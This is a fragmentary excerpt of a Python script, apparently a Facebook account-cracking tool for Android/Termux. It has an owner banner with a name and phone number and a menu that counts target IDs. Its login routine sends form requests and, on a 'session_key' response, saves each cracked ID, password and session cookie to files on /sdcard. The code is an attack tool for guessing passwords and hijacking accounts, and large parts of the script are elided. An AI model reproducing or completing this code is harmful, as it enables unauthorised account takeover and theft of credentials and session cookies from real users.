...
print('\n\033[0;97m[+]\033[1;32m WELLCOME TO JAHID TOOL 🌷...')
...
try:
	os.makedirs('/sdcard/RANA')
		...
		pass
sys.stdout.write('\x1b]2;JAHID-G\x07')
...
{W} [{R}+{W}]{R} OWNER   {R}:{R} JAHID HAŠŠÂN
{W} [{R}+{W}]{W} FB ID   {R}:{W} Jâhìd Kìňg
{W} [{R}+{W}]{W} WHATSAP {R}:{W} 01917466867
...
def menu():
			...
			if xd in ['1','01']:
				...
				print(f"{W} [{R}+{W}] {W} LoL IDZ : {R}%s "%(len(cps)))
				line()
...
'Content-Type': 'application/x-www-form-urlencoded'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/AHMED/SHAR-M1-COOKIE.txt','a').write(ids+'|'+pas+'|'+cookies+'\n')
                                        open('/sdcard/AHMED/RANA-M1-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def Create_menu():
	...
	print(f'{W} [{R}1{W}] {W}CREATE FILE BY AHMED RANA TOOL ')
